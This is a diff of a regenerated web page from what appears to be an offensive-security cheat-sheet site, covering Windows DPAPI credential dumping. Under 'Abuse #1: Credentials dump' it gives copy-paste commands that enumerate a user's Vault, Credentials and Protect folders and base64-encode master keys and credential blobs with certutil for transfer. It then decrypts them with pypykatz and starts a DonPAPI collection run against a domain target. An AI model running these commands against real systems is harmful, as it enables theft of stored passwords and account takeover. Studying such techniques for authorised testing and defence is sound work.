@@ -1,191 +1,164 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>DPAPI | TLDRBins</title>
-<meta name="robots" content='index, follow'>
+<meta name="robots" content="index, follow">
 <meta name="description" content="">
-<meta name="generator" content="hugo-index">
+<title>DPAPI | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
-<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
-<script>
-    window.addEventListener('load', () => {
-        quicklink.listen();
-    });
-</script>
-
-  </head>
-  <body><header>
+</head>
+<body>
+<header>
   <h1>
     <a href="https://tldrbins.github.io/">
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
-    </a>
-    <span class="hl">/</span>
-    <a href="https://tldrbins.github.io/dpapi/">
-      <span>DPAPI</span>
-    </a>
-  </h1>
-  <div class="js-toggle-wrapper">
-    <div class="js-toggle">
-        <div class="js-toggle-track">
-            <div class="js-toggle-track-check">
-                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
-            <div class="js-toggle-track-x">
-                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/dpapi/"><span>DPAPI</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
         </div>
-        <div class="js-toggle-thumb"></div>
-        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
     </div>
-</div>
-    
-<style>
- 
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
 
- 
-.js-toggle-wrapper, .js-toggle {
-    margin: 0;
-    padding: 0;
-    border: 0;
-    box-sizing: border-box;
-}
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
 
-.js-toggle-wrapper {
-    display: table;
-    float: right;
-    margin-left: auto;
-}
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
 
-.js-toggle {
-    touch-action: pan-x;
-    display: inline-block;
-    position: relative;
-    cursor: pointer;
-    background-color: transparent;
-    user-select: none;
-}
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
 
-.js-toggle-screenreader-only {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    clip: rect(0, 0, 0, 0);
-}
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
 
-.js-toggle-track {
-    width: 50px;
-    height: 24px;
-    border-radius: 30px;
-    background-color: hsl(223, 61%, 44%);
-    transition: background-color 0.2s ease;
-}
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
 
-.js-toggle-track-check,
-.js-toggle-track-x {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    top: 50%;
-    transform: translateY(-50%);
-    transition: opacity 0.25s ease;
-}
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
 
-.js-toggle-track-check {
-    left: 5px;
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
 
-.js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-}
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
 
-.js-toggle-track-x {
-    right: 5px;
-    opacity: 1;
-}
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
 
-.js-toggle--checked .js-toggle-track-x {
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
 
-.js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-}
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
 
-.js-toggle-thumb {
-    position: absolute;
-    top: 1px;
-    left: 1px;
-    width: 22px;
-    height: 22px;
-    border-radius: 50%;
-    background-color: #fafafa;
-    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
-}
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
 
-.js-toggle--checked .js-toggle-thumb {
-    transform: translateX(26px);
-}
-</style>
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
 
-<script>
-    var body = document.body;
-    var switcher = document.getElementsByClassName('js-toggle')[0];
-
-    
-    switcher.addEventListener("click", function() {
-        this.classList.toggle('js-toggle--checked');
-        
-        if (this.classList.contains('js-toggle--checked')) {
-            body.classList.add('dark-mode');
-            
-            localStorage.setItem('darkMode', 'true');
-        } else {
-            body.classList.remove('dark-mode');
-            setTimeout(function() {
-                localStorage.removeItem('darkMode');
-            }, 100);
-        }
-    })
-
-    
-    if (localStorage.getItem('darkMode')) {
-        
-        switcher.classList.add('js-toggle--checked');
-        body.classList.add('dark-mode');
-    }
-</script>
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
   <p class="desc"></p>
 </header>
-<div class="main">
-
+<main>
 <ul class="tagsList single">
-  
   <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
-  
   <li><a href="https://tldrbins.github.io/@mimikatz/">Mimikatz</a></li>
-  
   <li><a href="https://tldrbins.github.io/@dpapi/">DPAPI</a></li>
-  
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
-  
   <li><a href="https://tldrbins.github.io/@password/">Password</a></li>
-  
   <li><a href="https://tldrbins.github.io/@donpapi/">Donpapi</a></li>
-  
 </ul>
 <hr>
 <div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;">
-	</form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CREDENTIALS_HASH">CREDENTIALS HASH: </label><input type="text" name="CREDENTIALS_HASH"></div><div class="input-group"><label for="DIR">DIR: </label><input type="text" name="DIR"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="MASTERKEY_GUID">MASTERKEY GUID: </label><input type="text" name="MASTERKEY_GUID"></div><div class="input-group"><label for="MASTERKEY">MASTERKEY: </label><input type="text" name="MASTERKEY"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SID">SID: </label><input type="text" name="SID"></div><div class="input-group"><label for="TARGET">TARGET: </label><input type="text" name="TARGET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Params Form</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -193,7 +166,6 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-
 <style>
 #dynamicFormContainer {
 	width: 100%;
@@ -325,48 +297,61 @@ body.dark-mode #dynamicFormContainer button:hover {
 }
 </style>
   <h3 id="abuse-1-credentials-dump-from-linux">Abuse #1: Credentials dump (From Linux)</h3>
-<p>
-<button data-tabset="set1" data-tabcontent="tab1" >pypykatz</button>
+<p class="tabs">
+<button data-tabset="set1" data-tabcontent="tab1" class="active">pypykatz</button>
 
-<button data-tabset="set1" data-tabcontent="tab2" >DonPAPI</button>
+<button data-tabset="set1" data-tabcontent="tab2">DonPAPI</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect&#34;
-</span></span></span></code></pre></div><h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
-</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY&gt;&#34; C:\ProgramData\&lt;MASTERKEY&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
-</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;MASTERKEY&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c "dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Protect"
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode "C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Protect\<span class="o">&lt;SID&gt;</span>\<span class="o">&lt;MASTERKEY&gt;</span>" C:\ProgramData\<span class="o">&lt;MASTERKEY&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\<span class="o">&lt;MASTERKEY&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
 </span></span><span class="line"><span class="cl"><span class="go">cat masterkey_b64 | base64 -d &gt; masterkey_file
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get credential
-</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34; C:\ProgramData\&lt;CREDENTIALS_HASH&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
-</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;CREDENTIALS_HASH&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get credential
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode "C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Credentials\<span class="o">&lt;CREDENTIALS_HASH&gt;</span>" C:\ProgramData\<span class="o">&lt;CREDENTIALS_HASH&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\<span class="o">&lt;CREDENTIALS_HASH&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
 </span></span><span class="line"><span class="cl"><span class="go">cat credential_b64 | base64 -d &gt; credential_file
-</span></span></span></code></pre></div><h4 id="3-decrypt-credentials">3. Decrypt credentials</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password &lt;SID&gt; &#39;&lt;PASSWORD&gt;&#39; | tee pkf
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey masterkey_file pkf -o mkf
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi credential mkf credential_file
-</span></span></span></code></pre></div></div>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-decrypt-credentials">3. Decrypt credentials</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password <span class="o">&lt;SID&gt;</span> '<span class="o">&lt;PASSWORD&gt;</span>' | tee pkf
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey masterkey_file pkf -o mkf
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi credential mkf credential_file
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">DonPAPI collect -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' -t <span class="o">&lt;TARGET&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
